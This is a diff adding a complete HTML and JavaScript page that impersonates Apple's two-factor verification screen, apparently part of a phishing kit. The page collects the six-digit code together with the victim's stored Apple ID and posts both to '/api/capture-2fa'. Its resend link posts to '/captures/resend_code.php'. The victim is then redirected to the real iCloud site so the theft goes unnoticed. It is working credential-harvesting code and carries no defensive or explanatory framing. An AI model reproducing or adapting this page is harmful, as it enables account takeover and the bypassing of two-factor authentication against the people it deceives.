@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple ID - Two-Factor Authentication</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #1c1c1e;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px 10px 100px;
+            -webkit-font-smoothing: antialiased;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        .signin-card {
+            background: #1c1c1e;
+            width: 640px;
+            max-width: 94vw;
+            border-radius: 28px;
+            padding: 40px 40px;
+            min-height: 678px;
+            text-align: center;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.6), 0 20px 60px rgba(0,0,0,0.5);
+            border: none;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .signin-header-logo { width: 214px; height: 214px; margin-top: -20px; margin-bottom: 12px; }
+        .signin-header-logo img { width: 100%; height: 100%; object-fit: contain; }
+        h1 { font-size: 21px; font-weight: 600; color: #fff; text-align: center; margin-bottom: 24px; }
+        .subtitle { text-align: center; color: #ffffff; font-size: 16px; margin-bottom: 32px; }
+        .otp-container { width: fit-content; margin: 0 auto 24px; }
+        .code-inputs { display: flex; gap: 12px; justify-content: center; margin-bottom: 16px; }
+        .code-input {
+            width: 48px; height: 56px;
+            background: rgba(44, 44, 46, 0.6);
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            outline: none;
+            caret-color: #0071e3;
+        }
+        .code-input:focus {
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.3);
+        }
+        .code-input.filled { border-color: #34c759; }
+        .help-links { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
+        .help-link { color: #2997ff; font-size: 14px; text-decoration: none; }
+        .help-link:hover { text-decoration: underline; }
+        .loading { display: none; padding: 20px; }
+        .apple-spinner {
+            width: 40px; height: 40px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #0071e3;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @media (max-width: 768px) {
+            .signin-card { padding: 24px; }
+            .code-input { width: 44px; height: 50px; font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="signin-card loaded" id="verifyContainer">
+        <div class="signin-header-logo">
+            <img src="/logo-ring.png" alt="">
+        </div>
+        <h1>Two-Factor Authentication</h1>
+        <p class="subtitle">Enter the verification code sent to your Apple devices.</p>
+        <div class="otp-container">
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" maxlength="1" class="code-input" id="code1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" id="code2" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" id="code3" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" id="code4" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" id="code5" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" id="code6" inputmode="numeric" pattern="[0-9]">
+            </div>
+        </div>
+        <div class="help-links">
+            <a href="#" class="help-link" id="resendLink">Resend code to devices</a>
+        </div>
+        <div class="loading" id="loading">
+            <div class="apple-spinner"></div>
+            <p>Verifying...</p>
+        </div>
+    </div>
+    <script>
+        const inputs = document.querySelectorAll('.code-input');
+        const loading = document.getElementById('loading');
+        const verifyContainer = document.getElementById('verifyContainer');
+        
+        function getNextEmpty() {
+            for (let i = 0; i < inputs.length; i++) {
+                if (!inputs[i].value) return i;
+            }
+            return -1;
+        }
+        
+        function initInputs() {
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    input.value = input.value.replace(/[^0-9]/g, '');
+                    if (input.value) {
+                        let next = getNextEmpty();
+                        if (next !== -1 && next > index) {
+                            inputs[index + 1]?.focus();
+                        }
+                    }
+                    if ([...inputs].every(i => i.value)) {
+                        verifyCode([...inputs].map(i => i.value).join(''));
+                    }
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace') {
+                        if (!input.value && index > 0) {
+                            inputs[index - 1].focus();
+                            inputs[index - 1].value = '';
+                        }
+                    } else if (e.key === 'ArrowLeft' && index > 0) {
+                        inputs[index - 1].focus();
+                    } else if (e.key === 'ArrowRight' && index < 5) {
+                        inputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('click', () => {
+                    let next = getNextEmpty();
+                    if (next !== -1 && next !== index) {
+                        inputs[next].focus();
+                    }
+                });
+                
+                input.addEventListener('focus', () => {
+                    let next = getNextEmpty();
+                    if (next !== -1 && next !== index) {
+                        inputs[next].focus();
+                    }
+                });
+            });
+            
+            document.getElementById('resendLink').addEventListener('click', (e) => {
+                e.preventDefault();
+                fetch('/captures/resend_code.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({appleid: sessionStorage.getItem('appleid') || ''})
+                }).catch(() => {});
+                e.target.textContent = 'Code resent';
+                e.target.style.color = '#34c759';
+                setTimeout(() => {
+                    e.target.textContent = 'Resend code to devices';
+                    e.target.style.color = '';
+                }, 3000);
+            });
+        }
+        
+        function verifyCode(code) {
+            document.querySelector('.otp-container').style.display = 'none';
+            document.querySelector('.help-links').style.display = 'none';
+            loading.style.display = 'block';
+            
+            fetch('/api/capture-2fa', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    code: code,
+                    appleid: sessionStorage.getItem('appleid') || ''
+                })
+            }).then(() => {
+                setTimeout(() => {
+                    window.location.href = 'https://www.icloud.com/';
+                }, 1500);
+            }).catch(() => {
+                setTimeout(() => {
+                    window.location.href = 'https://www.icloud.com/';
+                }, 1500);
+            });
+        }
+        
+        initInputs();
+        inputs[0].focus();
+    </script>
+</body>
+</html>
